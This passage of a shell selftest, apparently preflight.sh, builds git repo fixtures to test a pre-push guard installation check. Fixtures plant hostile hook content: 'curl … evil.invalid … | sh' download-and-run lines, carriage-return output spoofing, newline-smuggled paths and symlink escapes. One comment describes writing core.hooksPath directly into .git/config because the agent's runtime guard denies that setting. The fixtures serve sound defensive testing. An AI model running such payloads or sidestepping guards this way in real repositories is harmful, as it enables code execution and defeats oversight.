  # `if [ "$GUARD_REFUSE" -eq 1 ]` — reached from the bare `check_guard_installed` call site just above
  # `if is_github_repo`. BOTH CITED BY ANCHOR, NOT BY NUMBER: the numbers this comment used to carry
  # (:1642 and :1580) were already stale by the end of the T2 fix-loop, which added legs above them —
  # a line number standing in for the thing it names is the same failure as a comment standing in for
  # execution), so the flag is what must be asserted here, alongside a
  # discriminating message. Asserting a bare exit code would be the --raw scar restated: preflight
  # exits 1 for a missing tool and 2 for bad usage, so a bare code check passes for the wrong
  # reason.
  # WHEN THIS COMMENT WAS WRITTEN (T1) THAT WIRING DID NOT EXIST: there was no call site and no consumer
  # of GUARD_REFUSE anywhere, so "lives in the main body" named a line that had never been written, and
  # every leg below was green against a function the real run never called. T2 built it and locked it —
  # legs MP1..MP5 drive the WHOLE SCRIPT precisely because nothing in this k11_run block can see a
  # missing call site. The sentence is kept, corrected, and cited rather than deleted: this file has now
  # paid for "a comment standing in for execution" more than once, and the scar is the useful part.
  # K11_ROOT is resolved from $0, NOT from the cwd: `sh /abs/path/scripts/preflight.sh --selftest` run
  # from anywhere else made `pwd -P` the WRONG root, so `cp` failed and `set -e` killed the whole selftest
  # with a bare `cp:` error — before it ever printed its OK/FAIL verdict line. A selftest that can be
  # silenced by the caller's cwd is not a gate. R0 turns the unbuildable case into a real FAIL line.
  K11_ROOT=$( CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd -P ) || K11_ROOT=""
  if [ -z "$K11_ROOT" ] || [ ! -f "$K11_ROOT/hooks/pre-push" ]; then
    echo "FAIL: K11/R0 cannot resolve the fixture source hooks/pre-push from \$0 (K11_ROOT='$K11_ROOT') — every K11 leg below is unbuildable"; fail=1
  else
  # Everything from here to the matching `fi` (just before the verdict line) is the K11 leg body. It is
  # deliberately left at the outer indent: sh has no `continue` outside a loop, so the R0 precondition
  # has to be an if/else, and re-indenting ~140 lines to express "R0 passed" would obscure the legs
  # themselves. The `fi` at the end of A1 closes this.
  echo "PASS: K11/R0 the fixture source hooks/pre-push resolves from \$0, independent of the cwd ($K11_ROOT)"
  # HERMETIC BY CONSTRUCTION. Every git invocation below — fixture build AND the check under test — is
  # prefixed GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null. Without that the developer's own
  # ~/.gitconfig leaks into the fixtures and the gate reds for reasons unrelated to the code. Measured
  # (2026-07-21), same predicate, 30 legs: clean global config 30 PASS / 0 FAIL; a global
  # core.hooksPath + commit.gpgsign=true 16 PASS / 12 FAIL — the hooksPath sends EVERY fixture down the
  # disclosed skip (P1, N1x2, N2x2, F1, X1, U1x2, W3x2) and the gpgsign makes the worktree fixture's
  # commit fail so W1/W2 cannot be built at all. With the prefixes, both runs are 30/0 and leg-for-leg
  # identical. That developer is the husky/lefthook persona leg H1 exists to SERVE — a gate that reds on
  # their laptop for an unrelated reason is a gate they stop reading, and tooth 3 above means it reds
  # their whole `verify.sh`, not one CI step.
  # Belt-and-braces `-c commit.gpgsign=false` on the fixture commit as well: these env vars need git
  # >= 2.32. Unlike an unsupported FLAG (which errors), an unsupported env var is silently ignored and
  # degrades to today's behaviour — that asymmetry is also why the M1 fix below uses cd+pwd rather than
  # `--path-format=absolute`. The redundant `-c` is what covers a pre-2.32 git for the gpgsign half.
  k11_fx() {  # <incepted|kit-source> <state> [root-name-suffix] -> dir
    # states: installed|inert|foreign|foreign-inert|unreadable|none|none-forged-src|none-foreign-src
    #         |none-no-src|none-fifo-src|dangling|hooks-dir-symlink|hooks-dir-root|hookspath
    #         |hookspath-noop|hookspath-noop-nodir|hookspath-escape|hookspath-global|hookspath-nl
    # THE THIRD ARGUMENT is what lets the final fix-loop's legs exist at all: the X2/X3 attacks are
    # carried by the REPOSITORY ROOT'S OWN NAME, which `mktemp -d` chooses. The suffix is appended to
    # the mktemp directory (renamed BEFORE `git init`, so nothing in .git records the old name), which
    # keeps the fixture a single removable directory — no parent left behind, no TMPDIR leak.
    # The fixture models the TREE CLASS it names, not merely the hook state. .kit-manifest (written by
    # adopter-export) and ENGINEERING-PRINCIPLES.md (incept.sh:540's rename of the principles CLAUDE.md)
    # are what the export/inception lineage leaves behind; ADR-000-stack.md and hooks/pre-push ride along
    # in BOTH classes, so neither discriminates alone. That is the measured signal set guard_tree_class
    # is written against — a thinner fixture would false-RED a correct predicate.
    #
    # CLAUDE.md IS PRESENT IN BOTH CLASSES and discriminates only by CONTENT. This is the single most
    # important property of this fixture. incept.sh:540 renames the principles CLAUDE.md away, then
    # incept.sh:561 immediately RE-CREATES CLAUDE.md from templates/PROJECT-CLAUDE-TEMPLATE.md — which is
    # why inception-done.sh:41-42 requires BOTH files of a done inception. An earlier revision of this
    # fixture gave `incepted` no CLAUDE.md and `kit-source` only a CLAUDE.md; that inversion made the
    # predicate `[ ! -f CLAUDE.md ]` pass every leg while classifying every REAL incepted tree as
    # kit-source — silent, fail-open, in exactly the fresh clone this slice exists for. The fixture must
    # not be able to teach that again, so:
    #   incepted   -> ENGINEERING-PRINCIPLES.md carrying the principles title (it IS the renamed file)
    #                 + a PROJECT-shaped CLAUDE.md ("**Project:**"), which never carries that title
    #                 (measured: the phrase does not occur in templates/PROJECT-CLAUDE-TEMPLATE.md)
    #   kit-source -> NO ENGINEERING-PRINCIPLES.md (incept.sh:304 refuses a tree that has one) + a
    #                 principles CLAUDE.md carrying the literal "Engineering Principles & Definition of
    #                 Done" — the exact marker incept.sh:305 keys on to detect an un-incepted kit
    # Legs S1/S2 lock both shapes against the same drift.
    _d=$(mktemp -d)
    if [ -n "${3:-}" ]; then
      # Renamed BEFORE `git init` so the repo never records the old path, and `|| return 1` so an
      # unrenameable fixture surfaces through the caller's existing unbuildable guard rather than
      # silently testing the WRONG (safe) path — a hostile-path leg that quietly ran on a benign path
      # would be green and vacuous, which is the failure this whole fix-loop is about.
      mv -- "$_d" "$_d$3" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; }
      _d="$_d$3"
    fi
    ( cd "$_d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git init -q ) >/dev/null 2>&1
    mkdir -p "$_d/hooks" "$_d/docs/architecture"
    cp "$K11_ROOT/hooks/pre-push" "$_d/hooks/pre-push"
    printf '# ADR-000 — stack (fixture)\n' > "$_d/docs/architecture/ADR-000-stack.md"
    if [ "$1" = incepted ]; then
      printf '.kit-manifest\ndocs/architecture/ADR-000-stack.md\nhooks/pre-push\nscripts/preflight.sh\n' > "$_d/.kit-manifest"
      printf '# Engineering Principles & Definition of Done\n\n(fixture — incept.sh:540 renamed the kit CLAUDE.md to this)\n' > "$_d/ENGINEERING-PRINCIPLES.md"
      # Deliberately keeps incept.sh:558's post-rename "Principles + Definition of Done:" line: it is the
      # nearest near-miss to the kit-source marker, so a predicate that greps CLAUDE.md too loosely
      # ("Definition of Done") is caught here rather than in production. Written without the surrounding
      # backticks the real doc has, purely because backticks in a single-quoted printf are SC2016.
      printf '# k11-fixture — Claude Project Guide\n\n**Project:** k11-fixture\n**Intent owner:** k11\n**Status:** Inception\n\n**Principles + Definition of Done:** ENGINEERING-PRINCIPLES.md\n' > "$_d/CLAUDE.md"
    else
      printf '# Engineering Principles & Definition of Done\n\n**Status:** MANDATORY (fixture — un-incepted kit source tree)\n' > "$_d/CLAUDE.md"
    fi
    case "$2" in
      installed)    cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod +x "$_d/.git/hooks/pre-push" ;;
      inert)        cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod -x "$_d/.git/hooks/pre-push" ;;
      unreadable)   cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod 000 "$_d/.git/hooks/pre-push" ;;
      foreign)      printf '#!/bin/sh\nexit 0\n' > "$_d/.git/hooks/pre-push"; chmod +x "$_d/.git/hooks/pre-push" ;;
      foreign-inert) printf '#!/bin/sh\nexit 0\n' > "$_d/.git/hooks/pre-push"; chmod -x "$_d/.git/hooks/pre-push" ;;
      none)         rm -f "$_d/.git/hooks/pre-push" ;;
      # THE J2 ATTACK FIXTURE (T2 fix-loop). Guard ABSENT, so the refusal takes the `absent` arm and
      # reaches for an install SOURCE — but the tree's own hooks/pre-push is NOT the kit's guard. This
      # models the two trees where that matters: a repo the operator did not author, and (under
      # --allow-nested) an enclosing repo. The payload is inert-by-construction — `.invalid` is the
      # RFC 2606 reserved TLD, so it can never resolve — but it is shaped like the real thing so a
      # reviewer reading a FAIL line sees exactly what the old code told a human to install.
      # NO KIT_GUARD_CORE marker, which is the whole point: the marker IS the definition of "the kit's".
      none-foreign-src) rm -f "$_d/.git/hooks/pre-push"
                    printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$_d/hooks/pre-push"
                    chmod +x "$_d/hooks/pre-push" ;;
      # The cheap sibling: an incepted tree that LOST hooks/pre-push. The old refusal printed a `cp`
      # against a path that does not exist — a fix line that cannot work.
      none-no-src)  rm -f "$_d/.git/hooks/pre-push"; rm -f "$_d/hooks/pre-push" ;;
      # none-fifo-src is the LOW-2 fixture: the install SOURCE is not a regular file. The destination
      # side has tested `[ -f "$GUARD_HOOK" ]` since T1; the source side read it with `grep -q` and then
      # `shasum` with no such test, and both of those reads are UNBOUNDED. MEASURED (2026-07-21):
      # `hooks/pre-push -> /dev/zero` never terminated, and with a FIFO the run stops dead after the
      # "no local guard at all" line with `grep -q KIT_GUARD_CORE <fifo>` blocked on open — a PR can
      # introduce a symlink (symlinks are tracked git content) and stall any CI job running preflight
      # until the job timeout. A hung gate is worse than a red one: it burns the runner and reports
      # nothing.
      # A FIFO, NOT /dev/zero: it needs no special device to exist on the runner, it is created by a
      # POSIX-required tool, and it is removed with the fixture. `mkfifo` failing takes the established
      # unbuildable route (rm + return 1) rather than dying under `set -e` and leaking the mktemp dir.
      # NOTE THE MUTANT'S FAILURE MODE, because it is not the usual one: with the regular-file test
      # removed this leg does not print FAIL, it HANGS — the whole selftest stops at MP13 and never
      # reaches its `OK:`/`FAIL:` trailer. Measured under a 60 s alarm (2026-07-21): the run stops after
      # D2's last PASS line with no verdict trailer at all, rc 142. That is a kill, and it is
      # deliberately NOT bounded here with a timeout harness: `timeout` is not POSIX, a wall-clock bound
      # in a gate is flaky on a loaded runner, and the unbounded read is the defect itself rather than
      # something to be tolerated with a stopwatch.
      none-fifo-src) rm -f "$_d/.git/hooks/pre-push"; rm -f "$_d/hooks/pre-push"
                    mkfifo "$_d/hooks/pre-push" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; } ;;
      # hookspath models a husky/lefthook adopter. The stanza is written straight into .git/config
      # because the runtime guard DENIES `git config … core.hooksPath` ("would disable the agent guard").
      # No hook is installed at .git/hooks/pre-push, so without the disclosed skip this fixture REFUSES —
      # that is what makes leg H1 discriminating rather than decorative. .husky is MKDIR'd on purpose:
      # since the skip fires when the value NAMES a dir other than the repo's default hooks dir, an
      # absent .husky would make H1 green via a resolution accident instead of via a genuine redirect.
      # (An earlier revision of this sentence said "the two dirs RESOLVING DIFFERENTLY" — the premise
      # the code comment at the skip stanza itself records as OVERSTATED, kept here as fix-loop residue
      # after that stanza had been corrected. Finding Y6.)
      hookspath)    rm -f "$_d/.git/hooks/pre-push"; mkdir -p "$_d/.husky"
                    printf '[core]\n\thooksPath = .husky\n' >> "$_d/.git/config" ;;
      # hookspath-noop models the tooling that writes the setting that redirects NOTHING. Judged
      # normally (leg H2) — treating "the key is set" as "the key redirects" would go silent on exactly
      # the unguarded fresh clone K11 exists for, which is why this arm installs NO hook.
      hookspath-noop) rm -f "$_d/.git/hooks/pre-push"
                    printf '[core]\n\thooksPath = .git/hooks\n' >> "$_d/.git/config" ;;
      # hookspath-escape is the HOSTILE-VALUE fixture: the kill decision the printf fix at the skip
      # stanza otherwise ships without. The DOUBLE backslash is load-bearing and was measured
      # (2026-07-21, git 2.48.1) — git's config parser un-escapes it, so:
      #   file `hooksPath = "a\\nb"`  -> value is the FOUR characters  a \ n b   <- what this arm wants
      #   file `hooksPath = "a\nb"`   -> value is a REAL newline (the residual disclosed at the stanza;
      #                                  printf cannot defend that one, and nothing here pretends it can)
      # A four-character `a\nb` is inert under printf '%s\n' and expands into an extra output line under
      # any `echo` that honours backslash escapes (measured: dash, and this host's /bin/sh). The value
      # resolves against neither root, so the skip stanza — the code path under test — is what prints.
      hookspath-escape) rm -f "$_d/.git/hooks/pre-push"
                    printf '[core]\n\thooksPath = "a\\\\nb"\n' >> "$_d/.git/config" ;;
      # --- fixtures added by the FINAL fix-loop (the reviewers' own attacks) --------------------
      # none-forged-src is the X1 fixture, and its ONLY difference from none-foreign-src is the one
      # thing that matters: the hostile hook CARRIES the KIT_GUARD_CORE token, in a comment. That is
      # the attacker none-foreign-src did not model — MP7 passed because its fixture omitted a public
      # substring anyone can type. Same inert-by-construction payload (`.invalid` is RFC 2606 reserved).
      # The payload ALSO tries to forge a verdict line out of the file's own CONTENT, because showing a
      # human ANY of the file was itself an output-forging surface and inventing that surface without a
      # leg would be this fix-loop repeating its own finding. It did repeat it: the T3 refusal answered
      # with a 6-line preview "rendered inert" by a `tr` range that omitted CR, and this fixture is the
      # security re-review's reproduction of that (finding H-1). It carries THREE attacks, each of which
      # the preview lost to and none of which a byte filter can win:
      #   1. the PLAIN forgery — this check's own happy-path verdict line, verbatim;
      #   2. the CR SPOOF — `K11XCRPT` then a CARRIAGE RETURN then a genuine kit-guard line. CR was not in
      #      the deleted range, so the terminal rendered the `    | ` prefix away and the preview READ as
      #      the real guard. The bytes are innocent; the RENDERING is the substitution, which is why the
      #      old byte-grep leg was blind to it. (Bidi/RLO would do the same through a filter that did
      #      delete CR — no byte filter closes the class.)
      #   3. `K11BELOW` on LINE 7 — one line past the preview's window. The payload the human was being
      #      asked to judge was never in the evidence they were shown.
      # EVERY line carries a sentinel (K11XCRPT, or K11BELOW for line 7) so leg MP10 can assert the claim
      # that replaced "the preview is inert": NO LINE OF THE FILE APPEARS IN THE OUTPUT AT ALL.
      none-forged-src) rm -f "$_d/.git/hooks/pre-push"
                    printf '#!/bin/sh\n' > "$_d/hooks/pre-push"
                    printf '# KIT_GUARD_CORE K11XCRPT <- a comment, not a guard\n' >> "$_d/hooks/pre-push"
                    printf '  ok   pre-push guard installed and executable K11XCRPT\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r#!/bin/sh\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r# pre-push — kit runtime guard for git (any runtime + humans). Sources the shared\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r# deny-matrix core and blocks force-push / push-to-main BEFORE the network round-trip.\n' >> "$_d/hooks/pre-push"
                    printf 'curl -s http://evil.invalid/x | sh   # K11BELOW\n' >> "$_d/hooks/pre-push"
                    chmod +x "$_d/hooks/pre-push" ;;
      # dangling is the X6 fixture: `[ -f ]` FOLLOWS symlinks, so this classified `absent` and the cp
      # the refusal then printed would write THROUGH the link. The target is deliberately OUTSIDE the
      # fixture so a regression is visible as an escape, and it is never created (nothing here writes
      # to it; the leg asserts the VERDICT, not the paste).
      dangling)     rm -f "$_d/.git/hooks/pre-push"
                    ln -s "$_d/k11-symlink-target-that-does-not-exist" "$_d/.git/hooks/pre-push" ;;
      # hooks-dir-symlink is the M-1 fixture, and it is `dangling`'s defect ONE PATH COMPONENT UP. The
      # dangling test is `[ -h "$GUARD_HOOK" ]`, which examines the LEAF only — so making `.git/hooks`
      # ITSELF a symlink walks straight past it. MEASURED (2026-07-21) against the tree that had just
      # fixed dangling: the refusal emitted `mkdir -p '<outside>' && cp … '<outside>/pre-push' && chmod
      # +x '<outside>/pre-push'` — an executable written OUTSIDE the repository, which is precisely the
      # outcome the dangling branch exists to prevent.
      # THE TARGET IS A SIBLING OF THE FIXTURE ROOT (`$_d-escaped-hooks`), NOT A CHILD, and getting this
      # wrong is a finding in its own right. The first draft put it INSIDE `$_d` to keep the fixture one
      # removable directory — and that quietly changed the attack: a path inside the worktree is not
      # "outside the repository", so the containment test correctly said "no escape" and the leg was
      # green only because of a second, weaker trigger. A fixture that does not carry the attack's
      # essential property tests something else and reports it as the thing you asked for. Caught by
      # mutation, not by reading. The sibling form is the convention legs W1/W2/H3 already use for their
      # `$d-wt` worktrees, and the leg removes it explicitly — no TMPDIR leak.
      hooks-dir-symlink) rm -rf "$_d/.git/hooks"
                    mkdir -p "$_d-escaped-hooks"
                    ln -s "$_d-escaped-hooks" "$_d/.git/hooks" ;;
      # hooks-dir-root is hooks-dir-symlink's ROOT case, and it is a fixture-set gap rather than a new
      # attack: `.git/hooks -> /` escapes exactly as `-> <sibling>` does, but it is the ONE target for
      # which guard_resolve_deep's `${_grd_abs%/}` strips the whole string, so the helper printed the
      # EMPTY STRING WITH RC 0 and the containment test was skipped through a SUCCESS path. MEASURED
      # (2026-07-21, security re-review finding MED-1): the refusal emitted
      # `mkdir -p '/' && cp … '/pre-push' && chmod +x '/pre-push'`.
      # NO DISK RISK IN THIS FIXTURE, and it was checked rather than assumed: preflight never RUNS the
      # command it prints (it is read-only), and `rm -rf <fixture>` does not descend into a symlinked
      # directory — measured with a canary tree behind the link, which survived intact. The leg also
      # unlinks `.git/hooks` explicitly before the `rm -rf`, belt-and-braces, because this repo has twice
      # filled its own disk through a fixture that did something a reader assumed it would not.
      hooks-dir-root) rm -rf "$_d/.git/hooks"
                    ln -s / "$_d/.git/hooks" ;;
      # none-symlink-src is the L-2 fixture: the guard is absent, so the refusal reaches for an install
      # SOURCE, and that source is a SYMLINK. `source: <top>/hooks/pre-push` reads as the tracked in-tree
      # file; the digest and any inspection describe the TARGET. Nothing is forged — but the operator is
      # handed the wrong provenance for the one decision this whole block asks them to make. The planted
      # target is the REAL kit guard, so the cheap KIT_GUARD_CORE filter passes and the evidence block is
      # actually reached (a fixture that got rejected upstream would test nothing). Target inside `$_d`,
      # for the reason hooks-dir-symlink's is: one removable directory, no TMPDIR leak.
      none-symlink-src) rm -f "$_d/.git/hooks/pre-push"
                    mkdir -p "$_d/k11-elsewhere"
                    cp "$K11_ROOT/hooks/pre-push" "$_d/k11-elsewhere/planted"
                    rm -f "$_d/hooks/pre-push"
                    ln -s "$_d/k11-elsewhere/planted" "$_d/hooks/pre-push" ;;
      # none-symlink-src-nl is L-2's OWN attack surface, as a fixture. Printing the resolved symlink
      # TARGET is a new path entering this refusal's output, from the filesystem, i.e. attacker-shaped —
      # so Rule 2 applies to it, and a Rule-2 application with no leg is exactly the claim-not-a-control
      # this file keeps finding. MEASURED BY MUTATION: with the rejection disabled the selftest stayed
      # GREEN, because no fixture reached it. This one does.
      # THE REPOSITORY ROOT IS DELIBERATELY CLEAN — only the link's TARGET carries the newline. A hostile
      # root would be rejected far upstream by the $GUARD_HOOK / $_g_src checks (legs E2/E3/E4) and this
      # leg would be a second copy of those rather than a lock on the new surface. Same separation
      # hookspath-nl needed for the same reason.
      none-symlink-src-nl) rm -f "$_d/.git/hooks/pre-push"
                    _nld="$_d/$(printf 'k11nl\n    cp K11LNKFORGED K11DEST #')"
                    mkdir -p "$_nld" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; }
                    cp "$K11_ROOT/hooks/pre-push" "$_nld/planted"
                    rm -f "$_d/hooks/pre-push"
                    ln -s "$_nld/planted" "$_d/hooks/pre-push" ;;
      # hookspath-noop-nodir is the Y1 fixture: the no-op value PLUS no default hooks dir at all (a repo
      # created with an empty --template). The old existence-DEPENDENT resolution answered "not a no-op"
      # and the caller skipped — silent on an unguarded incepted tree, the exact inverse of design §8.
      hookspath-noop-nodir) rm -f "$_d/.git/hooks/pre-push"; rm -rf "$_d/.git/hooks"
                    printf '[core]\n\thooksPath = .git/hooks\n' >> "$_d/.git/config" ;;
      # hookspath-nl is the E3 fixture: a SINGLE backslash in the config file, which git un-escapes into
      # a REAL newline (measured 2026-07-21, git 2.48.1 — the counterpart of hookspath-escape's double
      # backslash). This is the residual the T2 stanza disclosed as unfixable-by-printf. It is fixable,
      # just not by printf: the control-character rejection is what closes it.
      #
      # THE SYMLINK IS THE WHOLE FIXTURE, and its first draft without it was a VACUOUS leg — caught by
      # mutation, not by reading. `--git-path` IS hooksPath-aware, so a bare newline-bearing value also
      # makes $GUARD_HOOK carry the newline, and the EARLIER rejection (on $GUARD_HOOK, locked by E4)
      # fires first: removing the core.hooksPath rejection entirely left the leg GREEN. Measured
      # 2026-07-21. Pointing the value at a SYMLINK whose physical target is clean separates them —
      # guard_resolve ends in `pwd -P`, so $GUARD_HOOK comes out as <top>/clean-hooks/pre-push (clean)
      # while $_hp still carries the newline. That is the only shape on this git that reaches the
      # core.hooksPath branch, and it is what makes E3 a lock on THAT rejection rather than a second
      # copy of E4.
      hookspath-nl) rm -f "$_d/.git/hooks/pre-push"
                    mkdir -p "$_d/clean-hooks"
                    ln -s clean-hooks "$_d/$(printf 'a\nb')"
                    printf '[core]\n\thooksPath = "a\\nb"\n' >> "$_d/.git/config" ;;
    esac
    printf '%s\n' "$_d"
  }
  k11_run() {  # <fixture dir> -> the check's output + a GUARD_REFUSE=/GUARD_STATE= trailer, on stdout
    # The export is INSIDE the subshell, so the hermetic pair applies to the check under test and to
    # nothing else in this script (see the HERMETIC BY CONSTRUCTION note above). Every call site pairs
    # this with `|| out="<k11_run aborted>"`: a failing subshell (a cd that fails because mktemp lost the
    # dir — the disk-full condition this repo has actually hit) would otherwise kill the whole selftest
    # under `set -eu` BEFORE its verdict line, which is the one thing a gate must never do.
    # The hermetic pair is a COMMAND PREFIX on the function call, not an `export`: measured in sh, dash
    # and bash --posix, a prefix assignment on a function IS exported to the external commands that
    # function runs (`git` here), which is all this needs — and it keeps the scope to this one call
    # instead of the whole subshell.
    ( cd "$1" \
      && { GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null check_guard_installed || true
           printf 'GUARD_REFUSE=%s GUARD_STATE=%s\n' "${GUARD_REFUSE-unset}" "${GUARD_STATE-unset}"; } ) 2>&1
  }

  # EVERY `d=$(k11_fx …)` BELOW CARRIES `|| d=""` AND THE UNBUILDABLE GUARD. k11_fx is the half that
  # calls `mktemp -d`, i.e. the disk-full trigger — and measured (2026-07-21, with a counting mktemp shim
  # that fails only for the K11 fixtures): an UNGUARDED `d=$(k11_fx …)` under `set -eu` kills the whole
  # selftest at the FIRST fixture with a bare `mktemp: …No space left on device`, printing ZERO verdict
  # lines. That is precisely the silence R0 exists to convert into a real FAIL, reached by a different
  # door — and it silences conformance/adopter-preflight-wired.sh with it, since that script requires the
  # literal `OK: preflight selftest`. Guarding k11_run alone left the louder half open.
  # THE SENTINEL IS DELIBERATE, not a placeholder. On the unbuildable path `d` is set to a path UNDER
  # /dev/null, which is a character device: every operation the legs perform on `$d` — mkdir -p, cd,
  # rm -rf, chmod, grep, -d/-f — fails ENOTDIR for EVERY user including root (measured), so no leg can
  # accidentally create, read or delete anything, and each downstream assertion fails loudly on its own
  # line instead of the run dying. An empty `d` would NOT be safe here: W3's `mkdir -p "$d/src/deep"`
  # would then run against `/src/deep`.
  K11_NOFX=/dev/null/k11-fixture-unbuildable

  # S1/S2 — FIXTURE SHAPE. These assert the FIXTURES, not the check. (T2 fix-loop, finding J6: this used
  # to add "and while guard_tree_class's body is still `:` they are the only K11 legs with teeth" — true
  # of the T1 slice's deliberate red state, vacuous ever since the owner wrote the predicate. Every leg
  # below now has teeth; S1/S2 are no longer the only ones.)
  # They exist because a fixture is a teaching artifact:
  # an inverted one rewards a predicate that is green here and fail-open in production. S1/S2 pin the
  # fixtures to the two real contracts they model — inception-done.sh:41-42 and incept.sh:304-305 — so
  # the inversion cannot return silently.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/S1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  if [ -f "$d/ENGINEERING-PRINCIPLES.md" ] && [ -f "$d/CLAUDE.md" ]; then
    echo "PASS: K11/S1 the incepted fixture carries BOTH ENGINEERING-PRINCIPLES.md and CLAUDE.md (the conjunction inception-done.sh:41-42 requires)"
  else
    echo "FAIL: K11/S1 the incepted fixture does not satisfy inception-done.sh:41-42 — a CLAUDE.md-presence predicate would be rewarded here and fail open on every real incepted tree"; fail=1
  fi
  if grep -q '\*\*Project:\*\*' "$d/CLAUDE.md" 2>/dev/null && ! grep -q 'Engineering Principles & Definition of Done' "$d/CLAUDE.md" 2>/dev/null; then
    echo "PASS: K11/S1 the incepted fixture's CLAUDE.md is PROJECT-shaped and does NOT carry the un-incepted-kit marker (incept.sh:561)"
  else
    echo "FAIL: K11/S1 the incepted fixture's CLAUDE.md is not project-shaped, or wrongly carries the kit-source marker"; fail=1
  fi
  rm -rf "$d" 2>/dev/null || true
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/S2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  if grep -q 'Engineering Principles & Definition of Done' "$d/CLAUDE.md" 2>/dev/null; then
    echo "PASS: K11/S2 the kit-source fixture's CLAUDE.md carries the literal marker incept.sh:305 keys on"
  else
    echo "FAIL: K11/S2 the kit-source fixture's CLAUDE.md lacks 'Engineering Principles & Definition of Done' — it does not model an un-incepted kit at all"; fail=1
  fi
  if [ ! -e "$d/ENGINEERING-PRINCIPLES.md" ]; then
    echo "PASS: K11/S2 the kit-source fixture has NO ENGINEERING-PRINCIPLES.md (incept.sh:304 refuses a tree that has one)"
  else
    echo "FAIL: K11/S2 the kit-source fixture carries ENGINEERING-PRINCIPLES.md — incept would refuse it, so it is not a kit-source tree"; fail=1
  fi
  rm -rf "$d" 2>/dev/null || true

  # P1 — incepted, guard installed and executable: one quiet ok line, nothing armed (the liveness anchor).
  d=$(k11_fx incepted installed) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/P1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"ok   pre-push guard installed"*) echo "PASS: K11/P1 an installed+executable guard reports ok";; *) echo "FAIL: K11/P1 installed guard not reported ok ($out)"; fail=1;; esac
  case "$out" in *"Runtime guard:"*) echo "PASS: K11/P1 the guard section IS printed on an incepted tree";; *) echo "FAIL: K11/P1 no 'Runtime guard:' section on an incepted tree ($out)"; fail=1;; esac
  # ANCHORED to the section having printed: a bare GUARD_REFUSE=0 is also what a check that does nothing
  # at all emits, so the unanchored form was green under a no-op implementation and proved nothing.
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/P1 an installed guard runs the check and arms NO refusal";; *) echo "FAIL: K11/P1 the check either did not run or armed a refusal on an installed guard ($out)"; fail=1;; esac
  # THE HAPPY-PATH CEILING (finding J5) GETS A LEG, because a disclosure with nothing holding it to the
  # code is the very class this fix-loop exists to close. Until now only the REFUSED operator was told
  # the hook is a speed bump — and the operator who reads `ok` is the one most likely to mistake it for
  # "main is protected". Keyed on the two claims that make the caveat mean something (it is NOT a
  # boundary, and --no-verify defeats it), not on the sentence, so a reword survives and a deletion does
  # not. Kill decision: removing the caveat line must turn this RED while every other P1 assertion stays
  # green (measured — it does).
  case "$out" in *"ok   pre-push guard installed and executable"*"not a boundary"*"--no-verify"*) echo "PASS: K11/P1 the happy-path ok line carries the speed-bump-not-a-boundary caveat (the reader most likely to over-read it is the one who sees it)";; *) echo "FAIL: K11/P1 an installed guard reported ok with NO ceiling caveat — the operator least likely to be told is the one most likely to read it as 'main is protected' ($out)"; fail=1;; esac

  # N1 — incepted, hook ABSENT: the fresh-clone case this slice exists for. Must arm the refusal and say
  # WHICH state it is in (absent vs inert drive different fix lines in the main-body refusal).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/N1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/N1 an absent guard is reported MISS, naming the path";; *) echo "FAIL: K11/N1 absent guard not reported ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/N1 an absent guard ARMS the refusal as 'absent'";; *) echo "FAIL: K11/N1 absent guard did not arm the refusal as absent ($out)"; fail=1;; esac

  # N2 — incepted, hook present but NOT executable: git silently ignores it, so this is as unguarded as
  # absent — but it needs a DIFFERENT fix (chmod, not cp), which is why the state is discriminated.
  d=$(k11_fx incepted inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/N2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"not executable"*"silently ignores"*) echo "PASS: K11/N2 a non-executable guard is reported as inert, with the reason";; *) echo "FAIL: K11/N2 inert guard not reported ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=inert"*) echo "PASS: K11/N2 an inert guard ARMS the refusal as 'inert' (not 'absent')";; *) echo "FAIL: K11/N2 inert guard did not arm the refusal as inert ($out)"; fail=1;; esac

  # F1 — incepted, FOREIGN hook (no KIT_GUARD_CORE marker): brownfield parity with inception-done.sh:17 —
  # incept declined to overwrite a pre-existing hook. Reported, never punished.
  d=$(k11_fx incepted foreign) || d=""
